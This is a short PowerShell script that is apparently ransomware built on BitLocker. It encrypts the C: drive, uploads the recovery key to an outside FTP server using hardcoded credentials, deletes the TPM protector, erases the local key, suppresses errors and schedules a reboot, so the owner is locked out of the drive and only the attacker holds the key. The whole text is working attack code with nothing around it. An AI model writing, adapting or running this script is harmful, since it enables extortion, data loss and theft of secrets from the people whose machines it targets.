# One-stage: encrypt, exfil the key, delete the protector, delayed reboot
$ErrorActionPreference = 'SilentlyContinue'
manage-bde -on C: -RecoveryKey C:\key.bek -UsedSpaceOnly -SkipHardwareTest | Out-Null
$c = [Net.FtpWebRequest]::Create('ftp://eu-central-1.sftpcloud.io/' + $env:COMPUTERNAME + '.bek')
$c.Method = 'STOR'; $c.EnableSsl = $true
$c.Credentials = New-Object Net.NetworkCredential('geven','WRZhwk3yx3ep1d6PjOtUvJVKcWcfCUev')
$b = [IO.File]::ReadAllBytes('C:\key.bek')
$s = $c.GetRequestStream(); $s.Write($b, 0, $b.Length); $s.Close()
manage-bde -protectors -delete C: -Type TPM | Out-Null
Remove-Item C:\key.bek -Force
shutdown /r /t 3600
